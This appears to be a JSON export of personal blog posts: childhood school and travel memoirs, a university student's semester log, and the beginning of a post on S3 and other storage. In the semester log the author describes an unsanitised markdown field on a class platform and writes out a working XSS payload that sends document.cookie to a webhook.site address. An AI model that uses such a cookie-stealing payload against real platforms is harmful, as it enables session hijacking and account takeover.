\"specialization\" aloud.\n\nI was not sure if it is right, but I didn't give up.\n\nAnyway, i just said the word.\n\nAfter the judge said \"correct\", I relaxed.\n\nMr. Weng smiled at me. I saw that clearly.\n\nThe other two competitors both speed wrong.\n\nI could not believe in a million years that I was the champion!\n\nI was so terrific.\n\nTwo weeks later, I got a Collins dictionary and a \"Compact\" dictionary. Most of all, I got a trophy. \n\nLife is better than I thought, it simply is.\n\n## Other Unforgettable Memories\n\nAfter Spelling Bee, next came my birthday.\n\nI used to invite a lot of my friends to come and have a big cake on my old birthdays. My last one was horrible, when I accidentally invited a boy and he brought a gaming engine and started playing computer games crazily. I hated it and my birthday was ruined.\n\nThis year, my friends from previous school were away from me. Though I had made many friends this year, they weren't close.\n\nSo no friends came to my birthday this year, which meant I would have it alone. I waited for something to cheer me up when my mom's phone rang.\n\nIt was an invitation to interview in a very good middle school called \"Shibei Middle School\" in Shanghai. I was so excited to hear that news that I even forgot my birthday party!\n\nThe teacher who interviewed me is kind, she asked me to read a paragraph and asked me a question. She then asked me what I would do in the future. I just said I will be a scientist or a mathematician. If I ever get tired, I would read books or play football.\n\nThen the interview was over, after three days I was admitted. I was terrific.\n\nMy heart is like a blue sky with no clouds. I thought everything in the world is good, sadness all flew away. Yes, I was good in math competitions and then Spelling Bee and was going to one of the best middle school. So far, I was a wonderful student.\n\nAfter my birthday, I knew about Flat Stanley. It is a fantasy about a normal boy who became special when a board fell off and he became flat.\n\nAfter doing exercises about the book, Mr. Weng gave us a paper with the drawing of Stanley on it. I colored my Stanley and cut it off, then laminated it.\n\nSince then, I brought my own Stanley with me every time I was on a trip.\n\nMy father's birthday was coming.\n\nLast year I gave him a book with my essays, it was special. I just gave him a better essay book this year. \n\nIt was a surprise. I wrote my best essays in that book.\n\nI did prepare for a long time, about two months. I first wrote them on a composition notebook with pencil so I could erase easily. But then I realized I erased too much and that book was too messy. I copied them again to another notebook.\n\nI wrote about my school, multinational corporations, and all kinds of other things.\n\nHowever, the birthday present hadn't turned really wonderful, mom saw me writing for him and told my father a day before his birthday. \n\nBut I just pretended that day is his birthday, so it wasn't bad, also. Plus I found out that reading improved not only spelling but also writing.\n\n## Graduation\n\nFifth-grade was about to end, before I knew it, we started giving each other signatures and our telephone numbers. We were still going to communicate after graduation.\n\nMany things had happened this year. I began enjoying fifth-grade so much.\n\nI remembered my reading journey, and I just finished \"The Lion, The Witch, and The Wardrobe\". I thought Junie B. Jones was hard at the beginning of the year! I had already finished two hundred books. My aim of books to read this year was only fifty.\n\nI read so many books this year. I was proud. I just spotted \"The Baby-Sitters Club\" when I was walking around the library, and started reading fascinatedly. I had also finished the \"Nancy Drew\" series.\n\nIt was just like a wonderful chapter in a book which is about to end. I still wanted to start over again.\n\nI was a little said, but a graduation trip cheered me up.\n\nThe graduation trip was fun. It was a cool day with a blue sky and white clouds, the land swept by a gentle breeze. We got inside a big school bus and went to Shanghai Binjiang Forest Park.\n\nWe divided into groups and played. Every group had lunch themselves. We brought our lunch and went to a big rock near the seaside. Then we climbed up the rock and had lunch on it. The rock was just enough for several people and we fitted in with our food tightly.\n\nI brought much bread with me. I ate that on the rock and starred at the sea, the unlimited view, where waves are roaring and only boats can be seen on the sea. There, we shared our corners of the universe and our year of fun.\n\nThe day flew by, I really enjoyed myself, especially the lunch.\n\nThe day of graduation arrived so soon that I did not expect it to be here so fast. We sang the graduation song in Chinese. Our principle gave us a speech. Everyone had a photo with her, I felt so nervous standing beside the principle, but happy too.\n\nAfter singing the graduation song, everyone was about to leave. Each of us received a book that had name and picture of everyone else in the school in it.\n\nThen all the students went home. Fifth-grade ended full of joy and happiness.\n\nSometimes, I thought, Smic School is like a puzzle. It was missing a piece a year before. The missing piece is me. I was supposed to fit in perfectly. That's why I came in and had an impressive year.\n\n## Epilogue\n\nI learned many thing in fifth-grade. Playing flute in one of them. I can play many songs now.\n\nI improved my English so much that I could feel it. Tests became easier a lot. I read more than three hundred books now, where my old aim in the beginning of the year was only fifty.\n\nI became busier, I am in middle school. I stopped playing babyish stuff. I went to geometry classes every Monday after school. I have a math and Chinese class every weekend. Things changed a lot, and fifth-grade was just a piece of the beautiful memories.\n\nI knew my biggest harvest this year, I grew up.\n\nThe autobiography I wrote above is not really good, but it narrates one of my best childhood year. it is unforgettable forever. The story ends here.\n\n\n", "date": {"$date": "2016-11-13T00:00:00Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dee3"}, "title": "My America and Canada Journey", "type": "journal", "access": 1, "body": "## Prologue\n\nAfter the graduation of elementary school, summer vacation started. I had ten classes a week and became busier.\n\nOn the last weekday in the third week, I was on my way home and tired. I was standing in the crowded subway. After several days, I was going to America and Canada. \n\nI spotted Dad on the subway.\n\nWe waved and walked home happily.\n\nI couldn't focus in the summer classes these days. I was so excited about the trip. I almost felt like (A trip to America+Canada=Paradise).\n\n## Arriving(7.21-7.22)\n\nDear fifth-grade journal:\n\nToday is 7/21. Today I flew from Shanghai to Toronto. I felt my ear deaf during the take off. I was lucky I hadn't vomit. I vomited once before on the plane, when I ate so much. I went to my father's friend's house. I had an excellent dinner with turkeys, rice, chickens, and etc. I went out walking this evening. I read A to Z mysteries. I had a fun day.\n\nI put down the journal, which I kept for 3 months. Today I went to the bookstore and bought many books. I lost my watch. I thought I had lost it when i was walking out yesterday. We went to a supermarket and bought some fruits. We arrived at another friend of my father's house too. So far, America and Canada journey had been fun. It was really like paradise life with no homework. I enjoyed it.\n\n## I Missed Dinner(7.23-7.24)\n\nI was watching television when I suddenly felt so sleepy. I was tired because of the twelve hours time difference between China and Canada. i went to my bedroom and immediately started sleeping. I forgot about the great dinner.\n\nAfter I woke up, it was eleven in the night. I then slept again and felt a little dizzy. I read a Magic Tree House book in the morning.\n\nI realized I was missing an important dinner, which they had yesterday eveing when I slept. But I cheered myself up by thinking that I almost eat too much, cause I had too many times eating too much and felt sick and vomited in the night, that's not good, especially during trips.\n\n## Niagara Falls (7.24-7.25)\n\nWe drove to Niagara Falls. The hotel is on Stanley Avenue. I took a picture of Flat Stanley on that avenue. We ate dinner in Papa Johns. It was delicious.\n\nI went to Niagara Falls the next day. It was a Monday and raining hard. The sound of the Falls was like thunder. However, there were still many people. I wondered how many people will be there if it was a bright sunny day. I couldn't see the falls clearly because there was misty fog. It was a view that couldn't be described by words. So much water all fell at once. I got a little wet and cold. I had a fun day.\n\n## Hamburg (7.25-7.27)\n\nI went to visit Hamburg in America after playing a day in Niagara Falls. We checked our passports and credit cards when we were about to enter America. Unfortunately, we met an inspector who said we needed to be checked. I waited an hour and finally went through it.\n\nWe drove straight to Comfort Inn. It didn't have Wi-Fi that day.\n\nI had hamburgers in Hamburg. The next day I ate muffin. I went to many roads, such as Harvard Road, Columbia Road, all kinds of roads with good universities in America in their names. I took pictures with them. I then went to the beach. Mum was afraid of the sun, but me and father wasn't. I was soaking wet after playing in the waves. We ate lunch in a Chinese restaurant near the beach, which served Chou Mien. We went to Hibert College Library, which was closed. This was a busy and fantastic day.\n\n## Harvard and MIT (7.27-7.31)\n\nWe left Hamburg and flew to Boston. We lived in \"Best Western\". It is near the Alewife station, the terminal station of red line. I read A to Z Mysteries \"The White Wolf\". We were so tired and couldn't go to visit mom's friend. Whatever, I had a good day.\n\nThe next two days were actually fun. I had a wonderful Wednesday and a terrific Thursday. I went to Harvard University and MIT museum. My dream is going to MIT for university. In the first day, I bought a Magic Tree House book and finished reading it; I bought a hat; the subway in America was so slow compared to Shanghai, it was so old. I visited the freedom trail on the second day. I walked five miles and had lunch in Subway(the restaurant, not the real subway, which is the synonym of metro). The hotel had a special kind of chocolate cookies. I liked it.\n\nThen I went to Concord, I took the Commuter Rail. My father was leaving tomorrow. I went to swim. I also bought a watermelon by myself in Crosby's Marketplace. I followed the map and walked down Elm road. I turned right on Main Street. I was almost lost when I asked some kind people, and they showed me the way. I realized I should have turned right on Thoreu Road, but accidentally walked straight, cause the road has a different name on it on different sides of the intersection.  I turned to Sudbury Road instead. I came home at four and had a satisfying day.\n\nOn 7.31, my father went back to China. I would go to A-Star math camp to study AMC 10-12, although I was only sixth-grade, well, almost. Mom and I went to Walden Pond. We ate lunch at Starbucks. I ate a piece of bread. I was going to the camp next.\n\n## Concord Academy\n\nI swam for an hour in the pond in Best Western and quickly got my clothes back on. I was about to enter a summer camp.\n\nWhen I came to room 203, the room I would be staying with my roommate for three weeks, I saw my roommate had already been there. I went to my mother's room and changed my clothes, after one hour or more, the meeting would start.\n\nI sat in the cafeteria. Well, actually, we sat in the cafeteria. We were all the residential students. There were pizzas in the back, which made me feel hungry. Then our camp coordinator, Murat Biyik, gave us a speech. He told us what to do and what not to do.\n\nThen I went and got a student card, which we needed to wear every day in the camp.\n\nWe ate pizzas and went back to our rooms after the lecture. My roommate is named Justin. We were ready for the camp. A feeling inside me told, this was going to be fun, although it would also be a hard time.\n\n## First Day\n\nI slept early the mroning before. I got up and ate breakfast in the harvest room.\n\nI piled the things in my package then walked downstairs. I sat on the hotel sofa and waited the bus with a bunch of other students.\n\nI began to wonder if I had my pencil case. I didn't know how I got this feeling, it came inside me. I checked and suddenly noticed I hadn't brought it. Where could it be? I wondered. Then I heard the teacher say the bus was about to arrive. I was afraid that the teacher might be angry with me if I said I forgot my pencil case, so I just said to the teacher that I wanted to go to the bathroom, which he agreed (this is another teacher, not Murat Biyik). I ran upstairs to my room. It was just on my desk and I put it in my bag. I then walked down again out of breath. Luckily the bus still hadn't gone away, so I got into the bus and sat near Justin.\n\nWe went to school in another way. The bus drove down a highway and turned to Main Street. It then went to Lexington Road and turned bac. There were some gravestones on the way. We all got off and went into a room. Murat gave us another speech.\n\nThen I followed some students and a teacher into a classroom. I studied AMC 10-12. The morning teacher made us introduce ourselves, and said he is Kevin. I found out that I was the youngest one in my class. There were even high school students who were seventeen. I was eleven.\n\nIn the morning we had a test, and I got 6 out of 25. It was a little hard.\n\nWe had fun activities after lunch.\n\nIn the afternoon, the older teacher walked in (His name is Hikmet Erdogan) He is not really old, but looked quite old, and also a little fat. He loves to chew gum in class. He is humorous. He told us about logarithms.\n\nI didn't understand what logarithm is, so I asked Hikmet after class. He explained to me kindly.\n\nThen we had dinner. We went home in Murat's car. He asked us about how today was. I saw lights and the Best Western. I grabbed a chocolate cookie and went upstairs. I telephoned my mom and dad. The first day ended slowly, as slow as a snail crawling.\n\n## Some Other Events on the First Week\n\nThe second day (the first Tuesday) of the camp was much faster than the first one. I played Connect 4 with two black classmates. I also played Rubik. I read A to Z Mysteries The Zombie Zone. This is the end of A to Z Mysteries, later I would read the super editions.\n\nThe third day I had a bad lunch with spicy spaghetti. I chose to eat bread. We had a barbecue for dinner, which was so delicious. The smell of roast was everywhere. I couldn't see the building clearly because of the foggy smoke. I read Rain Reign and the first book of A to Z Mysteries Super Edition.\n\nThe fourth day we had rice for dinner! I missed rice so much since coming to America. There were spaghetti everywhere, every meal. I had already eaten this kind of food for a whole year in Smic School. I hate it now. I just ate rice. I hadn't eaten any of the other vegetables or bread. I was also a little tired and frustrated of $e^{i\\pi}=-1$ in the afternoon class. It was meant for grown-ups and too early for me. i was looking forward to the field trip this Saturday.\n\nOn the Friday of the week, I read Rain Reign. The book was so good and tells me about bravery. I liked it so much that I read it until eleven in the evening. \n\nI finally got rid of thing about the complex numbers and \"i\", which was so hard. I was happy about it.\n\nOn Saturday we traveled to freedom trail and MIT Museum. It was fun, and I took some pictures. I had traveled there on 7.28 and 7.29.\n\nThen on the seventh day, my mom came to see me and also brought some books along. The first week ended.\n\n## The Second Week\n\nWell, the second week was boring, just a little bit interesting.\n\nWe played Frisbee in the playground. Once it had fallen in the grass with a bunch of bees around. Some people (not including me) went to get it and got several bee bites.\n\nI played puzzles, they were so fun. But an unhappy thing happened. I couldn't find one piece of a puzzle, which was there the day before. So we completed it with two pieces left.\n\nThe teacher taught us number theory, which was so easy for me. I am very good at it. I was always the first once finishing the problems.  We also learned log base and probabilities, which was a little hard.\n\nIn the second Friday we played Sudoku in the fun activity time period. I liked Sudoku so much ever since I went to the summer camp and saw it. I was the first one finishing my Sudou in my group.\n\nI watched a detective movie called Forensic Files in the evening that day. It was so scary. It is about a woman who watches her phone until two o'clock in the morning and a man shot her. I didn't sleep well that night. I locked all the doors in the night and opened the curtains, so if the murderer awoke me by trying to unlock the back window, I would see him and call the police at once. Luckily, there wasn't anyone trying to shoot me. Even if there is, I had a roommate. Two people are stronger than just one.\n\nThis Saturday, we went to Harvard. I read the Chronicles of Narnia The Magician's Nephew. I fell in love reading it that I read it the whole time during that trip. I liked the time Digory saved his mother best.\n\nI read Everything for a Dog on 8.14. It was written by my favorite author, Ann M Martin. I ate watermelon and swam. My second week had passed.\n\n## The Third Week\n\nIn the third week our morning teacher changed to a guy called Ali Gurel. \n\nHe was nothing like the other teachers. I had a little trouble with English because I am from China. He didn't even explain the English words kindly to me.\n\nWe learned geometry, which I was not so good in. We learned sin, cos, tan, cot, sec, csc. When I searched for them in the evening in the Best Western lobby computer, three Chinese people came in. They were impressed that I was only sixth-grade and started learning such hard things.\n\nIn the night, a full moon glowed in the dark sky. I suddenly started to think about the poem Su Shi wrote, \"When will the bright moon appear\".\n\nThat Thursday, when I opened the water faucets, I couldn't close it. I called the front desk, but they only left it dripping. It was so hot in the night because of the water was so hot. I couldn't sleep in with the heat. I opened the air conditioner. Then Justin went to watch a film, which began at eleven thirty in the night. I was too afraid Murat would see the guys and punish them. I slept around one o' clock and was so frightened that a killer would break through the door.\n\nThe week was fun. There was a worm that came inside our classroom. I used my book to kill it.\n\nThen we graduated. Murat showed us many pictures. I was the fourth one in my class (in tests). I couldn't believe it! I was the youngest.\n\nMum and I went walking after I graduated from the summer camp. We walked to the library and the bookstore. Then I walked home alone. The way home was too long, too familiar... And it didn't seem familiar to me anymore now.\n\nJustin left that night. I was home alone. Luckily, I drifted off at once. I was still alive when I woke up in the morning. \n\nBut one sad thing happened that Saturday. I was going on my way back to China. Murat bought me an orange juice. A strict man took it away when we were going through the customs.\n\nThen we flew back to China. My American journey ended.\n \n## Epilogue\n\nThis summer, Concord Academy came and gone. The times we had fun is still vivid in my mind. It will never be gone. \n\nI still remembered the first day is just as long as the other days of the first week. The other days of the first week are as long as the second and the third week add together. Time time started like a snail and began getting faster and faster. It started to fly at last, where the last part was so various while the snail part was nothing.\n\nThat's what life ought to be.\n\nLife is like a moon, it's full of wax and wane.\nLife is like an ocean, it's full of ebb and flw.\nLife is like a mountain, it's full of peak and valleys.\nLife is full of ups and downs, persisting is the easiest way", "date": {"$date": "2016-11-13T00:00:00Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dee4"}, "title": "New Semester Start in USTC", "type": "journal", "access": 1, "body": "I came back from HongKong and I was very much broken. This new semester started out by me spending one week at home, then going to school and renting a new house in the High-Tech district of Hefei.\n\nAnyways, things are better so far compared to other semesters, if everything goes on fine after this.\n\n## Sanctions on Social Media\n\nI issued a sanction on all social media starting from September. This includes YouTube, Twitter, Bilibili, Weibo, etc.\n\nMedia hoarding was conducted before this ban, to supply ourselves with abundant videos to watch from in a fixed period. \n\nAfter the ban I installed the Redirector in Firefox that runs also in private windows. This redirects all social media to my RSS feed, which is aggregated from multiple sources, including Postgres Planet, AWS Machine Learning Blog, Toward Data Science, Cloudflare Blogs, and multiple other people's blogs. No matter how noisy the outside world is, RSS is always there, waiting for you to consume quietly and full of valuable knowledge!\n\n![Image](https://cdn.jimchen.me/302c82b4-6d93-4757-9899-6cacd116ac59-1725854892710.jpg)\n\nOf course, regarding certain circumstances where access to the media is quite necessary,  I will open a ticket for short time access(like hoarding more videos). After that the ticket will be closed.\n\nI sanctioned `mastodon.social` because of its political views being too extreme since I don't endorse or condemn any political parties, and aim to stay neutral and apolitical. While Mastodon is decentralized, the main instances are overly liberal. There are, however, a lot of Fediverse instances used for expressing Nazi ideas, which I also avoid as much as possibl\n\nThe only social media left is `Reddit`, particularly because of its large communities and necessary tech discussions. I proceed by redirecting it to `old.reddit.com`, a text-based Reddit frontend. The old reddit seems much better because it's text oriented and not addictive.\n\nFurther sanctions will be applied to any websites with political contents or consisting of discussions of You-Know-Who in China.\n\n## Previous Attempts\n\nThere was many previous failing attempts that eventually still got me back on social media. \n\n### January: Attempting to Hoard Some Videos\n\nI wasn't very familiar with S3 in January of this year, so I hoarded around 30 videos (each around 1 hour long) on `1tv.ru` with whisper to my Dropbox then downloaded it to local. I did this in a vastai A100 machine, obviously, not utilizing the GPU because I was quite stupid at that time. This was my first attempt, and failed because I didn't know how to hoard videos well.\n\n### March: Attempting to Build My Own VideoTube\n\nFor the whole length of March this year I attempted to build my own full-stack video tube from scratch. I wanted to hoard videos to it and then be done. But this is very inefficient as well. I used a Whisper and Facebook-NLLB for translation, and used them as a background runner. Of course to run these constantly, at least 8 GiB of RAM is required, and that doesn't guarantee smoothness and no bugs. Debugging the platform was a constant pain in the neck and there are just so many poor designs and bugs that I didn't know what to do with.\n\n### Embedded Links: An attempt for Isolation\n\nI utilized embedded htmls, like the \"share\" button on YouTube to create a playlist and put it on my blog, so I can put all the interesting videos from YouTube and Vkontakte and Dzen... on my blog and not have to go to the websites to watch them.\n\nThis is an attempt for isolation from these platforms, so like I could watch the videos but only the ones I wanted to watch. This is somewhat inefficient but with limitations, because I would sometimes click on those links, leading back to social media and addiction.\n\n### Privacy Frontends\n\nI tried to use private frontends after the embedded links doesn't really work out. I used private frontends long before this, and even occasionally now. I tried to rely on them.\n\nBut privacy frontends don't work out too well. This is because\n\n1. Most frontends are quite buggy\n2. Privacy frontends don't stop the appeal or addiction of social medias, leading me to go back to social media in private window out of curiosity, then getting addicted.\n\n## Utilizing RAG\n\nAccess to information, however, is critical for operations, whether I use social media or not. Fortunately, RAG LLMs can be utilized to fetch and combine information in real time. You ask them about a specific event, they can answer it appropriately.\n\nThere are lots of Free RAGs out there given you access them in supported locations, examples include `ChatGPT`, `Gemini`, `Poe`, `Perplexity`, of course, with generous free tiers. ChatGPT, in particular, have around 15 free queries a day in its frontend UI, far more than enough alone for fetching necessary information.\n\n## Renting a House in Hefei\n\nUpon arriving at Hefei immediately I went to an intermediary company, where I consulted for housing near USTC high-tech campus. I went to look at 2 houses and settled on a studio east of the campus. The apartment is quite big actually, and I need around half of the space.\n\nThe apartment consists of a bedroom, a living room, a toilet, and a mini-balcony. I throw away everything in the living room and toilet, and only used half of the bedroom.\n\nI put all furniture stacked in the kitchen, as always. I throw away the unnecessary ones, and bought around 20 cheap items on PinDuoDuo.\n\n\n![Image](https://cdn.jimchen.me/d3f79da3-9100-4bc3-99d1-cfa1ed5f9375-1725856381410.jpg)\n\n## Regarding Mobile Data\n\nSo I want some mobile data to use everyday. I couldn't figure out how to use the goddamn mini-program of China Mobile, and called them at least 5 times over the afternoon trying to buy some mobile data. I previously negotiated with China Telecom trying to get the Broadband, but it was nefariously difficult to get literally anything done. Anyways, takeaway is these company's consumer service is full of shit.\n\nSo like before I went to HongKong I forgot to cancel the broadband because I was so sad, and I called China Telecom and they say they can't handle it and asked for my money. Anyways I wasn't going to give any money.\n\nAnyways I got a deal (I think) with 28 RMB(4 USD) a month for 25 GiB of mobile data.\n\n## Hierarchy and Modularity\n\nSo I learned from CS168 in UC Berkeley that modularity provides abstraction, which, in turn makes things better and manageable. Similar to how 5 layers of Internet works, which each have to worry about its own problems and relies on best-effort of other layers, I also organized my State to be modular.\n\nAnyways I found the Internet very interesting and fun to work with, one of the most interesting course I ever studied.\n\n## Course in School\n\nRegarding the Internet course in school. So like by the time I could select courses all the two other teacher's course are occupied with no vacancy. So I have to select from a third teacher's course, who I coincidentally knew in WeChat. There was only about 18 students in that teacher's course while in the other 2 teacher's course there was like 120, rumors suggest students here prefer those 2 other teachers more (maybe?).\n\nAnyways so I added the teacher in WeChat (an app that is nefariously difficult to use) and he gave me the QR code of the class' Tencent QQ(which is full of bloated crap) group, before I asked, which I appreciate, probably because he checked and found I wasn't added to the QQ group.\n\nRegarding the Compilers course. So basically I signed up for it and tried to like, communicate with the TA from a QR code I found on their github page online which pointed to the class' Tencent QQ(which is full of bloated crap) group. They rely on a self-hosted Educoder(which has an ugly GUI) with an IP address and a port number without encryption.\n\nAnyways I got on the Educoder and couldn't get into the class, where the TA kept prompting that I missed the instructions given. I tried really hard to figure out from the instructions given, but I couldn't, so finally I was like \"I don't have permissions to join\", and he finally gave me the class link after 30 minutes.\n\nImagine these incompetent \u0447\u0435\u043b\u043e\u0432\u0435\u043a in school LMAO, like you have to login but without http anyone can spoof, and the class grading system was like built on top an IP and a port??? They can at least utilize nginx and Cloudflare for some basic encryption and security. Even someone as retarded as I can deploy far better platforms.\n\nThen the platform got down for no reasons. \u041e\u0447\u0435\u043d\u044c \u043f\u043b\u043e\u0445\u043e!\n\nRegarding the LUG(linux user group) in USTC. I sent them like 3 emails from my AWS mail, and got no response. Then I sent them another email from my school email, and I was like \"Is this email still in use? I received no responses.\" which they answered \"We didn't receive any emails from you\". I figured this might be an AWS server problem, since my email is deployed on AWS. Anyways, I sent them another 2 emails after that from my school email, and received no responses again.\n\nAnyways, takeaway is that I am not the one at fault here. I was frequently blamed for being the one not reaching out first(which clearly isn't true in this scenario), so I am being socially active.\n\nI contacted LUG via Tencent QQ(which is full of bloated crap), and I asked what I can do for LUG and that I am excited, and I showed them my self hosted websites, to which person replied \"interesting\", to which I replied \"thank you\", and that was it. LUG doesn't seem very enthusiastic so as I thought. Anyway, I reached out first for many times, and I don't really care about the club.\n\n## Calnet ID Expiration\n\nSo very very sadly, my Berkeley ID is going to expire soon, which means I will lost access to the email and all Berkeley related services. This is very sad. My year at Berkeley is full of regrets looking back, and I clearly paid far less effort than what I should have. \n\nI did not have the taste of victory or any sort of satisfaction before the year abruptly ended and I was kicked back to China. The year is full of failures and sadness, a deep sense of under-accomplishment, resulted, obviously, from lack of efforts. \n\nAt this day I am very sad that my Berkeley ID is expiring. I am very grateful for this opportunity to be in the world's best CS school for a short-term study. I am fortunate to have this encounter, yet not utilizing the opportunity well.\n\nBerkeley is the leader of computer science throughout the recent history. From early days of BSD, Internet, Risc-V, PostgreSQL, etc to current cutting edge companies like Databricks,, it is a place with the best computer science researchers in the world for many years. Gradescope, Ray, Lmsys all comes from Berkeley. \n\nAmongst this emotional overhaul, I started hoarding resources down from Berkeley course websites, since I would be losing access very soon, and these are legitimately really good resources. \n\n## Nefarious China Mobile\n \nChina Mobile is a piece of crap. It confuses the customers and I couldn't find anything I want, and it constantly errors without debugging logs to show what is wrong. \n\nSo basically I tried to add some mobile data, but it consistently errors, and charges me 10 RMB for 1 GB. It always offer many different options with no clear guidelines, and the ChatBot in the phone and in the sms are both very very stupid, like, not even GPT 3.5 level. The ChatBot shows minimal to no fine tuning efforts.\n\nAnyways, China Mobile charged me 130 RMB for nothing, that's why it's full of shit.\n\nAnd stop blaming me for not trying to figure it out because I did. I telephoned the shit company at least 10 times over the past two days, yet still struggles consistently with their policies and everything they offer. \n\nIs China Mobile trolling its customers on purpose? \n \nAnyways, I will always be blamed for \"not smart enough to learn\" or \"too stubborn\" or \"wasting money again\", so like I will apology for my problematic behaviors and hope for the best in the meantime.\n\n## What the USTC Networking Course Teaches\n\nGuess what? USTC networking course is teaching nothing.\n\nThat's right! No routing, transport, protocols, congestion control. But it's teaching frontend.\n\nAnd regarding frontend it's a total mess. The teacher is teaching JSP and Tomcat and has an assignment to upload your files to ustc server, and discourages https usage.\n\nAnd bruh I was like what? No mentions of modern JavaScript frameworks, no mention of backend database, no mention of servers, no mention of dockerization, you just need to do something, anything, and load the files from ftp to crappy ustc server for your homepage.\n\nRegarding frontend design I already had a website for 2 years even before I started studying computer science, essentially I set up a redirect to my domain from ustc home server. Never rely on something unreliable. USTC servers are largely unreliable outside of the school's Eduroam.\n\nAnd so I told the TA about 3 websites I built(in fact, much more than that, but some are a piece of junk), they are currently in use.\n\nAnd there is a demo website with broken links and the teacher wants you do build something like that.\n\nWhat I built is essentially all with Tailwind css and Nextjs in a neo-minimalism way. It works best for me but I don't know if anyone appreciate that? \n\nI already hate this course now.\n\n## Regarding Registration in Beginning of Semester \n\nBasically there is a policy for you to register every time a semester starts and you must first pay the damn tuition. I paid and didn't pay the school dorm fees and I couldn't register. I refreshed many times and just couldn't.\n\nEventually a teacher reached out to me on WeChat and he was like \"pls go register\", and I screenshot the page I was like \"tell me how?\" Eventually I had to phone a lot of people to debug the problem sorta like that and finally they asked me to go to the main campus and like formally cancel the dorm before I could register.\n\nSo I took a taxi the next day to main campus and I was like trying to find the right people to communicate and it was hugely complicated everything. I went to the old library and it was broken down in maintenance mode. I went to the 321 house and it was closed. I was soaked in sweats in the really hot day.\n\nEventually I phoned like 3 or 4 people and I was told to go to a building. Again, everything is really difficult. I went there and people told me to go back to 321 house, and I was like what? Anyways, somehow the door opened this time after I knocked and I was able to fill a form.\n\nAgain it was quite complex, and Berkeley doesn't require you to fill a form like this to cancel dorm. You can just come and go, and student dorm is a scarce resources in many universities.\n\nI got the form and it asked for parents and teachers signatures and didn't know what to do. But I went back to the finance management in school and finally got it done, a lot faster than my expectations.\n\nBut the database from finance needs 1 day time to sync to the registration department, and I wonder wtf is that, do they delay the whatever cron job by one day or what. Anyways in the meantime things are still going on quite well.\n\n## Applying Aggressive Neo-Minimalism\n\nSo after a while I began to apply aggressive neo-minimalism. This is because managing cloud services is very much a struggle and I am using non-conventional apps. They are superior and much better objectively obviously, but using lots of apps still make me very tired.\n\nAnyways, the key takeaway from here is like I started applying neo-minimalism, essentially prioritizing some apps that are absolutely very important to me and using them mainly, while sorta marginalizing the rest of the apps.\n\nIt's not depreacting these apps, it's just basically using some very extensively and being more familiar with fewer things and pushing down more things.\n\nIn particular, I used my own blog editor instead of my Mastodon instance, because my Mastodon instance has no friends, so it feels like being alone anyways. Also, my blog editor supports images, so it's like using my Blog editor for Twitter. Sounds weird, but effectively removing one more app.\n\nI removed the dediated tasks app, also to my own Blog editor.\n\nI know that there are a lot of benefits of abstractions, and separation of concerns, but then again, concentration and pruning still helps. iI's not muddling different functionalities together, but rather using the same functionality and less apps for lesser dedicated guis.\n\nWe will continue to apply the ticket system in the use of external social media.\n\n## Problematic Platform and Dismissive TAs\n\nRegarding the Educoder platform mentioned before, the platform is very problematic.\n\nIt doesn't have any CSP policies, you can input markdown to it, and I discovered this when it rendered images directly from my CDN in markdown.\n\nBasically it have a markdown on the left and rendering HTML on the left, but it fails to sanitize the inputs. Also the cookie isn't HTTP Only, so if I input\n\n\n`<img src=\"invalid\" onerror=\"fetch('https://webhook.site/...'+document.cookie)\">`\n\n\nIt will successfully post the person's cookie to the malicious site. There is only one cookie called `_educoder__session`, so I literally logged in.\n\n\nThe point is the school's platform is so very shitty and lacks all security measures, and I could theoretically hijack the TA's cookie and login easily, although I wouldn't ever do that because of consequences.\n\nAnyways, I told the TA privately about this case and he disregarded me. This is a class platform, and I got no idea who to contact. Anyways this platform is a stupid broken piece of shit.\n", "date": {"$date": "2024-09-09T04:04:46.586Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dee5"}, "title": "Three Types of Storages Mechanism: Git, Database, and S3", "type": "web-dev", "access": 1, "body": "This post is a recap of 3 popular and fundamental storage mechanisms that are behind almost every online storage out there. Although this has already been extensively discussed in previous posts, this post aims to categorize and give a better abstraction.\n\nWe talk about these terms in an inclusive way Git (or any version control system, including Mozilla-hg), database (SQL and NoSQL, graph database, and so on), and S3 (or any object storage out there, since most cloud providers explicitly mention s3-compatible when selling their services, and that S3 is a pioneer in the early days).\n\n## S3\n\n### Use Cases\n\nS3 compatibles are heavily used to store large binary blobs, like videos. Object storage is behind almost every video website out there. Object storage is cheaper than SSD or HDD, and scales far better. \n\nObject Storage, or similar technologies, is the backend for all kinds of \"drives\", like Google Drive, Dropbox, and iCloud...\n\nS3 can also be used to host a website front and can be easily integrated with a CDN for distribution. This approach is common practice, but it isn't game-changing since you can put a website frontend on disk and utilize CDN for it as well. Also, for a website truly to scale up, we would need elastic load-balancers and distributed backend computing as well, which is quite overkill with a small website. Only using CDN for the front end isn't very beneficial anyway as it is akin to having a native offline client, and the browser caches it anyway, so it's mainly beneficial to reduce server load in the front end. You would get the same latency calling the backend (which likely does the hard work).\n\n### Pros\n\nS3 is known for availability (99.99% availability of objects and fast delivery, especially with CDN), large scalability, and durability (Amazon S3 offers 99.999999999%, a total of 11 9's of durability. This means that for every 10,000,000,000,000 objects stored, on average, only one object per year may be lost.).\n\n### Cons\n\nS3 is known for lacking in security. A lot of leaks of confidential information were caused by incompetent devs making their S3 buckets public. (search \"leaky buckets\" on Google and there are hundreds of these cases) Amazon addresses this problem by making buckets private by default with Cors policies and prompting for \"I understand these consequences\" before making a bucket public.\n\nS3 is known for incurring a huge cost for data transfer fee outbound, notably 0.09 USD/GB in 2024, achieving so-called \"vendor lock-in\", where pushing objects into S3 is easy, but retrieving is very expensive. S3 has no inbound fees. Other s3-compatible cloud providers, for example, [Cloudflare and BackBlaze, charge far less](https://getdeploying.com/reference/data-egress).\n\nSee this [reddit post](https://old.reddit.com//r/devops/comments/1cgklx9/an_article_citing_important_s3_bucket_pricing/), attackers can incur charges on a victim's S3 bucket after knowing the bucket name, then dummy pushing from the command line(since S3 charges for unauthorized requests as well). This is a very real concern since S3 has very few endpoints but is mostly accepted as a fact of life.\n\nS3 has this \"pre-signed URL\", mainly used for clients to upload objects directly to the S3 bucket without the server, generating a pre-signed URL that you can use for a fixed amount of time to upload say, your videos. This leaks the bucket name. To hide the bucket name, [someone suggested utilizing an AWS Lambda function instead of \"pre-signed urls\"](https://old.reddit.com//r/aws/comments/174lelr/is_it_possible_to_use_a_presigned_s3_object_url/). Someone suggests creating buckets with random suffixes. However, \"rotating\" the S3 buckets to achieve a regular bucket name change is virtually 